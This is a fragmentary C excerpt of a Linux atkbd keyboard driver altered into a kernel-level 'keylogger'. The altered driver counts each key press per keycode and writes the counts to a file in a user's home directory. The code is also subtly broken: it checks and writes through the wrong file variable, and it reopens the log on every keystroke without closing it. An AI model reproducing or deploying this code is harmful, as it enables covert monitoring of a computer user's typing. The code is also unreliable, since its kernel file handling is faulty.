...
#include <linux/namei.h>  // for PATH_MAX
...
static int keycode_flags[256] = { 0 };
struct file *logfile = NULL;
const char *keycode_to_name[256] = {
...
static off_t offset_for_key(unsigned short keycode){
	return keycode * LINE_LENGTH;
}
struct file *open_log_file(void) {
	struct file *file = NULL;	
	int err = 0;

    	file = filp_open("/home/mentee/keylogfile.txt", O_WRONLY | O_CREAT, 0644);
	
    	if (IS_ERR(logfile)) {
		err = PTR_ERR(logfile);
        	printk(KERN_ERR "keylogger: Failed to open log file due to err %d\n", err);
        	
	}
	return file;
}

void close_log_file(struct file *file) {
        filp_close(file, NULL);
}

int write_to_log_file(struct file *file, unsigned short keycode) {
    off_t offset;
    char buf[LINE_LENGTH];
    int written = 0;

    offset = offset_for_key(keycode);
    snprintf(buf, LINE_LENGTH, "%-20s: %d\n", keycode_to_name[keycode], keycode_flags[keycode]);
    
    file->f_pos = offset;
    written = kernel_write(logfile, buf, strlen(buf), &file->f_pos);
    return written;
}
...
static void atkbd_log_work(struct work_struct *work)
{
	struct atkbd *atkbd = container_of(work, struct atkbd, work);
	
	logfile = open_log_file();
	write_to_log_file(logfile, atkbd->scancode);
				   ...
				   unsigned int flags)
{
	...
	printk(KERN_INFO "keylogger: Received scancode %02x\n", code);
	...
	default:
		...
		if(value == 1 || value == 2){
			keycode_flags[keycode]++;
			atkbd->scancode = keycode;
			schedule_work(&atkbd->work);
		}
...
static int atkbd_connect(struct serio *serio, struct serio_driver *drv)
{
	...
	INIT_WORK(&atkbd->work, atkbd_log_work);		
